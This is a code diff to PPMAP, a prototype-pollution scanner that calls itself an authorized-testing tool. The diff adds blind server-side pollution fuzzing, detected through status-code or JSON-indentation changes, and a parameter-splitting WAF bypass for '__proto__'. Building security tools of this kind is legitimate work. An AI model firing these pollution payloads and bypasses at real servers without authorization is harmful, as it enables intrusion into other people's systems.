@@ -3008,76 +3008,101 @@ return window['{marker}'];
 
         return findings
 
-    def test_blind_gadgets(self, target_url, request_data=None) -> List[Dict[str, Any]]:
+    def test_blind_gadgets(self, target_url, request_data=None) -> List[Finding]:
         """
         [Tier 4] Blind Gadget Fuzzing
         Iterates through common dangerous properties (gadgets) discovered by static analysis tools (pp-finder)
-        and tries to pollute them. Since this is blind, we look for 500 errors or anomalies.
+        and tries to pollute them. Since this is blind, we look for anomalies like status code 510 or 
+        JSON indentation changes.
         """
         print(
-            f"{Colors.BOLD}[→] Testing Blind Gadget Properties (pp-finder list)...{Colors.ENDC}"
+            f"{Colors.BOLD}[→] Testing Blind Gadget Properties (Advanced Bypasses)...{Colors.ENDC}"
         )
-        findings: List[Dict[str, Any]] = []
+        findings: List[Finding] = []
 
-        # If we have request_data (POST), use it. Otherwise, use URL.
-        # Construct base payload structure
+        # Baseline check for JSON indentation
+        baseline_resp = self.session.get(target_url, verify=False)
+        baseline_indent = len(baseline_resp.text) - len(baseline_resp.text.lstrip())
 
-        for gadget in progress_iter(GADGET_PROPERTIES, desc="Fuzzing Gadgets"):
+        from ppmap.payloads import SSPP_PAYLOADS, MUTATION_VECTORS
+
+        for payload_dict in SSPP_PAYLOADS:
             try:
-                # 1. Construct Payload
-                # We try both string and object values
-                payloads = [
-                    # String (Test for error/reflect)
-                    f'{{"__proto__":{{"{gadget}":"PPMAP_FUZZ"}}}}',
-                    # Object (Test for crash/logic change)
-                    f'{{"__proto__":{{"{gadget}":{{"polluted":true}}}}}}',
-                ]
+                # Send Request
+                headers = {"Content-Type": "application/json"}
+                resp = self.session.post(
+                    target_url,
+                    json=payload_dict,
+                    headers=headers,
+                    timeout=5,
+                    verify=False,
+                )
 
-                for payload in payloads:
-                    # Send Request
-                    headers = {"Content-Type": "application/json"}
-                    if request_data:
-                        # Merge with existing data if possible, or usually just send the payload if it's JSON
-                        # For simplicity in blind fuzzing, we often just send the payload as the body
-                        data_to_send = payload
-                    else:
-                        data_to_send = payload
-
-                    resp = self.session.post(
-                        target_url,
-                        data=data_to_send,
-                        headers=headers,
-                        timeout=5,
-                        verify=False,
+                # Detection 1: Status Code Override (e.g. 510)
+                if resp.status_code == 510:
+                    print(f"{Colors.FAIL}[!] BLIND SSPP DETECTED (Status Code Override): {payload_dict}{Colors.ENDC}")
+                    findings.append(
+                        Finding(
+                            type=VulnerabilityType.PROTOTYPE_POLLUTION,
+                            name="Blind Server-Side Prototype Pollution (Status Code Override)",
+                            severity=Severity.CRITICAL,
+                            description="The server returned a polluted status code (510), indicating successful prototype pollution of the response logic.",
+                            payload=str(payload_dict),
+                            url=target_url,
+                        )
                     )
 
-                    # Detection Logic
-                    # 1. Status Code Anomaly (500 often means we hit a gadget that broke something)
-                    if resp.status_code == 500:
-                        # We treat 500 as a "Potential" finding in blind fuzzing
-                        # But to avoid noise, we only report if it's consistent or has specific error text
-                        if "PPMAP_FUZZ" in resp.text or "syntax" in resp.text.lower():
-                            print(
-                                f"{Colors.WARNING}[!] Potential Gadget Found: {gadget} (500 Error + Reflected/Syntax){Colors.ENDC}"
-                            )
-                            findings.append(
-                                {
-                                    "type": "blind_gadget",
-                                    "gadget": gadget,
-                                    "payload": payload,
-                                    "evidence": f"Status {resp.status_code}",
-                                }
-                            )
-                            break  # Move to next gadget
+                # Detection 2: JSON Indentation Change
+                current_indent = len(resp.text) - len(resp.text.lstrip())
+                if "json spaces" in str(payload_dict) and current_indent != baseline_indent:
+                    print(f"{Colors.FAIL}[!] BLIND SSPP DETECTED (JSON Indentation Change): {payload_dict}{Colors.ENDC}")
+                    findings.append(
+                        Finding(
+                            type=VulnerabilityType.PROTOTYPE_POLLUTION,
+                            name="Blind Server-Side Prototype Pollution (JSON Layout)",
+                            severity=Severity.CRITICAL,
+                            description="The server's JSON response indentation changed, indicating successful pollution of framework settings.",
+                            payload=str(payload_dict),
+                            url=target_url,
+                        )
+                    )
 
             except Exception as e:
-                logger.debug(f"Ignored error: {type(e).__name__} - {e}")
+                logger.debug(f"Blind test error: {e}")
 
-        if not findings:
-            print(
-                f"{Colors.GREEN}[✓] Blind gadget fuzzing completed (No obvious crashes){Colors.ENDC}"
-            )
+        return findings
 
+    def test_hpp_bypass(self, target_url) -> List[Finding]:
+        """
+        [Tier 5] HTTP Parameter Pollution (HPP) Bypass
+        Exploits WAF/Parser character stripping or concatenation (ASP.NET style).
+        e.g. ?q=__pro&q=to__[polluted]=true
+        """
+        print(f"{Colors.BOLD}[→] Testing HTTP Parameter Pollution (HPP) Bypass...{Colors.ENDC}")
+        findings: List[Finding] = []
+        
+        # Payload construction: __proto__[hpp_test]=polluted split into q=__pro&q=to__
+        hpp_url = f"{target_url}?{urllib.parse.quote('__pro')}&{urllib.parse.quote('to__')}[hpp_test]=polluted"
+        
+        try:
+            # Verification via Browser logic
+            self.driver.get(hpp_url)
+            time.sleep(2)
+            if self.driver.execute_script("return Object.prototype.hpp_test === 'polluted'"):
+                print(f"{Colors.FAIL}[!] HPP BYPASS DETECTED: {hpp_url}{Colors.ENDC}")
+                findings.append(
+                    Finding(
+                        type=VulnerabilityType.PROTOTYPE_POLLUTION,
+                        name="HTTP Parameter Pollution (HPP) Prototype Pollution",
+                        severity=Severity.HIGH,
+                        description="Bypassed WAF/Filter by splitting the '__proto__' key into multiple parameters.",
+                        payload="__pro & to__",
+                        url=hpp_url,
+                    )
+                )
+        except Exception:
+            pass
+            
         return findings
 
     def test_descriptor_pollution(self, target_url) -> List[Dict[str, Any]]:
@@ -4512,9 +4537,25 @@ return window['{marker}'];
             # v3.6 HASH-BASED PP (WAF BYPASS) - NEW
             hash_pp_findings = self.test_hash_based_pp(target_url)
 
+            # v4.2 ADVANCED RESEARCH-BASED TESTS - NEW
+            blind_findings = self.test_blind_gadgets(target_url, request_data=request_data)
+            hpp_findings = self.test_hpp_bypass(target_url)
+
             # v3.0 ADVANCED FEATURES - NEW TESTS
             waf_bypass_findings = self.test_with_waf_bypass(target_url)
             confidence_findings = self.test_with_confidence_scoring()
+            
+            # Combine all findings
+            all_findings.extend(jquery_findings)
+            all_findings.extend(xss_findings)
+            all_findings.extend(post_findings)
+            all_findings.extend(server_pp_findings)
+            all_findings.extend(dom_xss_pp_findings)
+            all_findings.extend(hash_pp_findings)
+            all_findings.extend(blind_findings)
+            all_findings.extend(hpp_findings)
+            all_findings.extend(waf_bypass_findings)
+            all_findings.extend(confidence_findings)
             
             endpoint_findings = []
             if run_discovery:
@@ -4667,8 +4708,12 @@ return window['{marker}'];
                 self.driver.close()
 
         for f in all_findings:
-            if "url" not in f:
-                f["url"] = target_url
+            if isinstance(f, Finding):
+                if not f.url:
+                    f.url = target_url
+            elif isinstance(f, dict):
+                if "url" not in f:
+                    f["url"] = target_url
 
         return all_findings
 
@@ -5386,14 +5431,14 @@ console.log(obj.polluted);  // Check if prototype was polluted</code><br><br>
         
         <div class="section">
             <h2>⚖️ Disclaimer</h2>
-            <p>This report was generated by PPMAP v4.1.0 for authorized security testing only.
+            <p>This report was generated by PPMAP v4.2.0 for authorized security testing only.
             The findings should be validated and addressed by qualified security professionals.
             Always obtain proper authorization before performing security assessments on any target.
             Unauthorized access to computer systems is illegal.</p>
         </div>
         
         <footer>
-            <p>PPMAP v4.1.0 | Prototype Pollution Multi-Purpose Assessment Platform</p>
+            <p>PPMAP v4.2.0 | Prototype Pollution Multi-Purpose Assessment Platform</p>
             <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
         </footer>
     </div>
